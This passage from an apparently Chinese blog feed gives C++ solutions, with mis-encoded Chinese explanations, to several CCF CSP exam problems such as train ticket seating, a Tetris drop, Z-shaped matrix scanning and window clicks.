class="hljs-number">0</span>;i &lt; k;i++)<br>&#123;<br>cin &gt;&gt; s[i][<span class="hljs-number">0</span>];<br>cin &gt;&gt; s[i][<span class="hljs-number">1</span>];<br>cin &gt;&gt; s[i][<span class="hljs-number">2</span>];<br>s[i][<span class="hljs-number">2</span>] = s[i][<span class="hljs-number">1</span>] + s[i][<span class="hljs-number">2</span>];<br><span class="hljs-keyword">if</span> (s[i][<span class="hljs-number">2</span>] &gt; max) <br>&#123;<br>max = s[i][<span class="hljs-number">2</span>];<br>&#125;<br>&#125;<br><span class="hljs-comment">//cout &lt;&lt; &quot;maxçš„å€¼ä¸º&quot; &lt;&lt; max &lt;&lt; endl;</span><br><span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> t = <span class="hljs-number">0</span>; t &lt;= max; t++) <br>&#123;<br><span class="hljs-comment">//æ¯ä¸€ä¸ªæ—¶åˆ»éƒ½è¦å¤„ç†ï¼Œå…ˆè¿˜å†å–ï¼Œè¿˜æŒ‰é’¥åŒ™çš„ç¼–å·å¤§å°è¿˜</span><br>count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>;m &lt; k;m++)<br>&#123;<br><span class="hljs-keyword">if</span> (s[m][<span class="hljs-number">2</span>] == t) <span class="hljs-comment">//ç»Ÿè®¡å‡ºæ‰€æœ‰åœ¨è¯¥æ—¶åˆ»è¦è¿˜é’¥åŒ™çš„äººçš„é’¥åŒ™å·ï¼Œå› ä¸ºè¦æŒ‰ç…§ç¼–å·è¿˜</span><br>&#123;<br><br>r[count] = s[m][<span class="hljs-number">0</span>];<br>count++;<br>&#125;<br>&#125;<br><span class="hljs-comment">//æ’åº</span><br><span class="hljs-comment">/*if (count &gt; 0) </span><br><span class="hljs-comment">&#123;</span><br><span class="hljs-comment">qsort(r, count - 1, sizeof(int), comp);</span><br><span class="hljs-comment">&#125;*/</span><br><span class="hljs-comment">//cout &lt;&lt; &quot;æ‰“å°ræ•°ç»„&quot; &lt;&lt; endl;</span><br><span class="hljs-comment">//è¿›è¡Œå†’æ³¡æ’åº</span><br><span class="hljs-type">int</span> temp;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> ii = <span class="hljs-number">0</span>; ii &lt; count<span class="hljs-number">-1</span>; ii++) <br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> jj = <span class="hljs-number">0</span>; jj &lt; count - <span class="hljs-number">1</span> - ii; jj++) <br>&#123;<br><span class="hljs-keyword">if</span> (r[jj] &gt; r[jj + <span class="hljs-number">1</span>]) <br>&#123;<br>temp = r[jj];<br>r[jj] = r[jj + <span class="hljs-number">1</span>];<br>r[jj + <span class="hljs-number">1</span>] = temp;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//è¿˜é’¥åŒ™</span><br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> p = <span class="hljs-number">0</span>; p &lt; count; p++) <br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> q = <span class="hljs-number">0</span>; q &lt; n; q++)<br>&#123;<br><span class="hljs-keyword">if</span> (b[q] == <span class="hljs-literal">false</span>) <br>&#123;<br>a[q] = r[p];<br>b[q] = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-comment">//æ‹¿é’¥åŒ™</span><br><span class="hljs-type">int</span> id;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> w = <span class="hljs-number">0</span>; w &lt; k; w++) <br>&#123;<br><span class="hljs-keyword">if</span> (s[w][<span class="hljs-number">1</span>] == t) <br>&#123;<br>id = <span class="hljs-built_in">search</span>(a, s[w][<span class="hljs-number">0</span>], n);<br>b[id] = <span class="hljs-literal">false</span>;<br>a[id] = <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">//cout &lt;&lt;t&lt;&lt; &quot; æ—¶åˆ»çš„çŠ¶æ€ä¸º:&quot; &lt;&lt; endl;</span><br><span class="hljs-comment">/*for (int r = 0; r &lt; n; r++)</span><br><span class="hljs-comment">&#123;</span><br><span class="hljs-comment">cout &lt;&lt; a[r] &lt;&lt; &quot; &quot;;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">cout &lt;&lt; endl;*/</span><br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> r = <span class="hljs-number">0</span>; r &lt; n; r++)<br>&#123;<br>cout &lt;&lt; a[r] &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>&#125;<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="2016å¹´">2016å¹´</h1><h2 id="201609-2-ç«è½¦è´­ç¥¨">201609-2 ç«è½¦è´­ç¥¨</h2><p>è¿™é¢˜ä¸éš¾ï¼Œåªéœ€è¦</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,p;<br>    <span class="hljs-type">int</span> count;<br>    <span class="hljs-type">int</span> sit[<span class="hljs-number">21</span>];<br>    cin &gt;&gt; n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">21</span>; i++)<br>    &#123;<br>        sit[i]=<span class="hljs-number">5</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        cin &gt;&gt; p;<br>        <span class="hljs-keyword">for</span>(count = <span class="hljs-number">1</span>; count &lt; <span class="hljs-number">21</span>; count++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(sit[count]&gt;=p)<br>            &#123;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= p; j++)<br>                &#123;<br>                    cout &lt;&lt; (count<span class="hljs-number">-1</span>)*<span class="hljs-number">5</span>+(<span class="hljs-number">5</span>-sit[count])+j &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>                &#125;<br>                sit[count]-=p;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(count == <span class="hljs-number">21</span>)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(count = <span class="hljs-number">1</span>; count &lt; <span class="hljs-number">21</span> &amp;&amp; p &gt;=<span class="hljs-number">0</span>; count++)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(sit[count])<br>                &#123;<br>                    <span class="hljs-keyword">if</span>(sit[count]&lt;=p)<br>                    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= sit[count]; j++)<br>                    &#123;<br>                        cout &lt;&lt; (count<span class="hljs-number">-1</span>)*<span class="hljs-number">5</span>+(<span class="hljs-number">5</span>-sit[count])+j &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">else</span><br>                    &#123;<br>                        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= p; j++)<br>                        &#123;<br>                            cout &lt;&lt; (count<span class="hljs-number">-1</span>)*<span class="hljs-number">5</span>+(<span class="hljs-number">5</span>-sit[count])+j &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-type">int</span> num = p;<br>                p-=sit[count];<br>                sit[count]-=num;<br>            &#125;<br>        &#125;<br>        cout &lt;&lt; endl;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="201604-2-ä¿„ç½—æ–¯æ–¹å—">201604-2 ä¿„ç½—æ–¯æ–¹å—</h2><p>è¿™ä¸ªé¢˜ç›®ä¹Ÿæ˜¯å¾ˆéœ€è¦æ€è·¯çš„ï¼Œæš´åŠ›è‚¯å®šå†™ä¸å‡ºæ¥ï¼Œæˆ‘çš„æƒ³æ³•å°±æ˜¯æ‰¾åˆ°è¿™ä¸ªæ–¹å—çš„å·¦ä¸‹è§’å®šä½ï¼Œéšåæ¯æ¬¡è®©å…¶å¯¹äºæ•´ä½“è€Œè¨€ä¸‹é™1ï¼Œå¹¶ä¸”é€ä¸ªéå†æ–¹å—ä¸èƒŒæ™¯ï¼Œå¦‚æœæœ‰å†²çªçš„åœ°æ–¹é‚£ä¹ˆè¯´æ˜ä¸Šä¸€ä¸ªä½ç½®å°±æ˜¯ç­”æ¡ˆï¼Œæ€è·¯ç†æ¸…ä¹‹åå¼€å†™ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">bool</span> bb=<span class="hljs-literal">false</span>;<br>    <span class="hljs-type">int</span> x;<br>    <span class="hljs-type">int</span> lowx=<span class="hljs-number">0</span>,lowy;<br>    <span class="hljs-type">int</span> square[<span class="hljs-number">20</span>][<span class="hljs-number">10</span>];<br>    <span class="hljs-type">int</span> n[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">memset</span>(square, <span class="hljs-number">1</span>, <span class="hljs-built_in">sizeof</span>(square));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">15</span>; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">10</span>; j++)<br>        &#123;<br>            cin&gt;&gt;square[i][j];<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>        &#123;<br>            cin&gt;&gt;n[i][j];<br>        &#125;<br>    &#125;<br>    cin &gt;&gt; x;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> y = <span class="hljs-number">0</span>; ; y++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">4</span>; i++)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt;<span class="hljs-number">4</span>; k++)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(n[i][k]&amp;&amp;square[i+y][k+x<span class="hljs-number">-1</span>])<br>                &#123;<br>                    bb=<span class="hljs-literal">true</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(bb) <span class="hljs-keyword">break</span>; <br>        &#125;<br>        <span class="hljs-keyword">if</span> (bb) <br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">4</span>; i++)<br>            &#123;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt;<span class="hljs-number">4</span>; k++)<br>                &#123;<br>                    <span class="hljs-keyword">if</span>(n[i][k])<br>                    square[i+y<span class="hljs-number">-1</span>][k+x<span class="hljs-number">-1</span>]=n[i][k];<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">15</span>; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">10</span>; j++)<br>        &#123;<br>            cout &lt;&lt; square[i][j] &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>        &#125;<br>        cout &lt;&lt; endl;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="2014å¹´">2014å¹´</h1><h2 id="201412-2-Zå­—å‹æ‰«æ">201412-2 Zå­—å‹æ‰«æ</h2><p>è¿™é“é¢˜çš„æ€è·¯ä¸»è¦åœ¨äºå‘ä¸Šæ‰«æå’Œå‘ä¸‹æ‰«æçš„åˆ‡æ¢ï¼Œå¦‚æœç¢°åˆ°ä¸Šè¾¹ç•Œå°±å¾—å¾€å³è¾¹èµ°ï¼Œå¦‚æœç¢°åˆ°çš„æ˜¯å³è¾¹ç•Œå°±è¦å¾€ä¸‹é¢èµ°ï¼Œä¾æ¬¡ç±»æ¨ï¼Œèµ°å®Œä¹‹åè½¬å˜æ–¹å‘ã€‚å¦‚æœæ˜¯å‘ä¸Šèµ°å°±æ¯æ¬¡x-1å’Œy+1ï¼Œå‘ä¸‹èµ°å°±æ˜¯x+1è€Œy-1ï¼Œå¾—åˆ°è§„å¾‹ä¹‹åå°±å¾ˆå¥½å†™äº†ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-type">int</span> arr[<span class="hljs-number">501</span>][<span class="hljs-number">501</span>];<br>    cin &gt;&gt; n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j++)<br>        &#123;<br>            cin &gt;&gt; arr[i][j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-type">int</span> x=<span class="hljs-number">1</span>,y=<span class="hljs-number">1</span>;<br>    <span class="hljs-type">bool</span> w = <span class="hljs-literal">false</span>;<span class="hljs-comment">//è½¬å¼¯</span><br>    <span class="hljs-type">bool</span> up=<span class="hljs-literal">true</span>;<span class="hljs-comment">//æ–¹å‘</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,arr[x][y]);<br>    <span class="hljs-keyword">while</span>(x!=n||y!=n)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(up)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(x<span class="hljs-number">-1</span>&gt;=<span class="hljs-number">1</span>&amp;&amp;y<span class="hljs-number">+1</span>&lt;=n)<span class="hljs-comment">//æ²¡ç¢°åˆ°è¾¹ç•Œ</span><br>            &#123;<br>                x--;<br>                y++;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(y&lt;n&amp;&amp;x==<span class="hljs-number">1</span>)<span class="hljs-comment">//ç¢°åˆ°ä¸Šè¾¹ç•Œæœªè½¬å¼¯</span><br>            &#123;<br>                y++;<br>                up=<span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(y==n)<span class="hljs-comment">//å³è¾¹ç•Œ</span><br>            &#123;<br>                x++;<br>                up=<span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">if</span>(y<span class="hljs-number">-1</span>&gt;=<span class="hljs-number">1</span>&amp;&amp;x<span class="hljs-number">+1</span>&lt;=n)<span class="hljs-comment">//æ²¡ç¢°åˆ°è¾¹ç•Œ</span><br>            &#123;<br>                y--;<br>                x++;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(x&lt;n&amp;&amp;y==<span class="hljs-number">1</span>)<span class="hljs-comment">//ç¢°åˆ°å·¦è¾¹ç•Œ</span><br>            &#123;<br>                x++;<br>                up=<span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(x==n)<span class="hljs-comment">//ä¸‹è¾¹ç•Œ</span><br>            &#123;<br>                y++;<br>                up=<span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %d&quot;</span>,arr[x][y]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="201403-2-çª—å£">201403-2 çª—å£</h2><p>è¿™é“é¢˜ç›®çš„æ€è·¯ä¹Ÿä¸éš¾ï¼Œå°±æ˜¯æ¯æ¬¡è¾“å…¥çš„æ—¶å€™ä»æœ€é«˜å±‚è¿›è¡Œåˆ¤æ–­è½åœ¨å“ªä¸ªåŒºåŸŸï¼Œéšåä¾¿å°†è¯¥åŒºåŸŸç½®ä¸ºæœ€ä¸Šå±‚ï¼Œä¹Ÿå°±æ˜¯ä¼˜å…ˆçº§æœ€é«˜ï¼Œå…¶ä»–æ¯”å…¶é«˜çš„çª—å£å…¨éƒ¨å‘åæŒªä¸€ä½å³å¯ï¼Œå¯ä»¥ä½¿ç”¨ä¸€ä¸ªæ•°ç»„ä¿å­˜ç¬¬iä¸ªç­‰çº§ä¸ºå“ªä¸ªçª—å£ï¼Œè¿™æ ·å°±å¯ä»¥æ¯æ¬¡éƒ½ä»æœ€é«˜ç­‰çº§çª—å£å¼€å§‹éå†ã€‚</p><p>ä»£ç ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> n,m,windows[<span class="hljs-number">11</span>][<span class="hljs-number">4</span>],pri[<span class="hljs-number">10</span>];<br>    <span class="hljs-type">bool</span> yes;<br>    cin &gt;&gt; n &gt;&gt; m;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        pri[i]=<span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>        &#123;<br>            cin &gt;&gt; windows[i][j];<br>        &#125;<br>        pri[i]=i;<br>    &#125;<br>    <span class="hljs-type">int</span> x,y;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++)<br>    &#123;<br>        cin &gt;&gt; x &gt;&gt; y;<br>        yes = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = n<span class="hljs-number">-1</span>; j &gt;= <span class="hljs-number">0</span>; j--)<span class="hljs-comment">//ä»æœ€é«˜çº§å¼€å§‹éå† pri[]æ•°ç»„ä»£è¡¨ç¬¬jä¸ªç­‰çº§æ˜¯å“ªä¸ªçª—å£</span><br>        &#123;<br>            <span class="hljs-keyword">if</span>(x&gt;=windows[pri[j]][<span class="hljs-number">0</span>]&amp;&amp;x&lt;windows[pri[j]][<span class="hljs-number">2</span>]&amp;&amp;y&gt;=windows[pri[j]][<span class="hljs-number">1</span>]&amp;&amp;y&lt;windows[pri[j]][<span class="hljs-number">3</span>])<br>            &#123;<br>                <span class="hljs-type">int</span> tmp = pri[j];<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k =j<span class="hljs-number">+1</span>; k &lt; n; k++)<br>                &#123;<br>                    pri[k<span class="hljs-number">-1</span>]=pri[k];<br>                &#125;<br>                pri[n<span class="hljs-number">-1</span>]=tmp;<br>                yes=<span class="hljs-literal">true</span>;<br>                cout &lt;&lt; pri[n<span class="hljs-number">-1</span>]<span class="hljs-number">+1</span> &lt;&lt; endl;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(x&gt;windows[pri[j]][<span class="hljs-number">0</span>]&amp;&amp;y&gt;windows[pri[j]][<span class="hljs-number">1</span>]&amp;&amp;x&lt;=windows[pri[j]][<span class="hljs-number">2</span>]&amp;&amp;y&lt;=windows[pri[j]][<span class="hljs-number">3</span>])<br>            &#123;<br>                <span class="hljs-type">int</span> tmp = pri[j];<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k =j<span class="hljs-number">+1</span>; k &lt; n; k++)<br>                &#123;<br>                    pri[k<span class="hljs-number">-1</span>]=pri[k];<br>                &#125;<br>                yes=<span class="hljs-literal">true</span>;<br>                pri[n<span class="hljs-number">-1</span>]=tmp;<br>                cout &lt;&lt; pri[n<span class="hljs-number">-1</span>]<span class="hljs-number">+1</span> &lt;&lt; endl;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(!yes)<br>        cout &lt;&lt; <span class="hljs-string">&quot;IGNORED&quot;</span> &lt;&lt; endl;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>ccf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ¯”èµ›è®°å½•</title>
    <link href="/2023/12/11/%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/"/>
    <url>/2023/12/11/%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/</url>
    
